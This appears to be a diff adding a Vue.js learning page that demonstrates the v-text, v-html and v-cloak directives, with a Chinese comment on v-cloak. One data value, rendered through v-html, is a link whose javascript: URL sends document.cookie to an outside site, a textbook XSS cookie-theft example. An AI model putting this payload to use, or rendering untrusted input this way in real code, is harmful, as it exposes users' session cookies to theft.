@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="../js/vue.js"></script>
+</head>
+<body>
+  <div id="root">
+    <div v-bloak>ni,{{name}}</div>
+    <div v-text="name">hi,</div>
+
+    <div v-html="str">hi,</div>
+
+    <div v-html="str2"></div>
+  </div>
+<script src="http://localhost:8080/resource/5s/vue.js"></script>
+</body>
+<script>
+  new Vue({
+    el:'#root',
+    data:{
+      name:'佛祖',
+      str:'<h3>你好啊</h3>',
+      str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>全场零元起</a>'
+    }
+  })
+  
+</script>
+</html>
+<!-- v-cloak指令（没有值）：
+1.本质是一个特殊属性：Vue创建实例并接管容器，会删除v-cloak属性
+2.使用css配合v-cloak可以解决网速慢时，页面产出的{{xxx}}问题 -->
